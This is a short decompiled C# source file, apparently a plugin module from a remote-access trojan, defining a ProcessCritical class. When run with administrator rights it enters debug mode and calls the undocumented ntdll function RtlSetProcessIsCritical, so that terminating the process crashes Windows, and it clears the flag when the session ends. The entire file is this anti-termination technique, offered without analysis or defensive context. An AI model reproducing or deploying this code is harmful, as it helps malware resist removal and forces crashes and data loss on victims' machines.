using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using Microsoft.Win32;

namespace Plugin;

public static class ProcessCritical
{
	[DllImport("ntdll.dll", SetLastError = true)]
	public static extern void RtlSetProcessIsCritical(uint v1, uint v2, uint v3);

	public static void SystemEvents_SessionEnding(object sender, SessionEndingEventArgs e)
	{
		if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			Exit();
		}
	}

	public static void Set()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
		{
			return;
		}
		try
		{
			SystemEvents.SessionEnding += new SessionEndingEventHandler(SystemEvents_SessionEnding);
			Process.EnterDebugMode();
			RtlSetProcessIsCritical(1u, 0u, 0u);
		}
		catch
		{
		}
	}

	public static void Exit()
	{
		try
		{
			RtlSetProcessIsCritical(0u, 0u, 0u);
		}
		catch
		{
			while (true)
			{
				Thread.Sleep(100000);
			}
		}
	}
}
